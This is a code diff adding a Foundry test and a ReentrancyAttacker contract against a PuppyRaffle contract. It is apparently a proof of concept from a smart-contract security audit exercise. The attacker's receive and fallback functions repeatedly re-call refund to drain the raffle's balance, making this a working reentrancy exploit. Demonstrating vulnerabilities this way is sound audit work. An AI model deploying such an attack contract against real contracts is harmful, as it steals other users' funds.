@@ -241,4 +241,72 @@ contract PuppyRaffleTest is Test {
     }
 
     // forge test --mt testDoS -vvv
+
+    function test_reentrancyRefund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        // uint256 balanceBefore = address(playerOne).balance;
+        // uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
+
+        // vm.prank(playerOne);
+        // puppyRaffle.refund(indexOfPlayer);
+
+        // assertEq(address(playerOne).balance, balanceBefore + entranceFee);
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether); // to give attackUser some money
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        // Attack
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("starting attacker contract balance: ", startingAttackContractBalance);
+        console.log("starting contract balance: ", startingContractBalance);
+
+        console.log("ending attacker contract balance: ", address(attackerContract).balance);
+        console.log("ending contract balance: ", address(puppyRaffle).balance);
+
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if ( address(puppyRaffle).balance < entranceFee) return;
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable{
+        _stealMoney();
+    }
 }
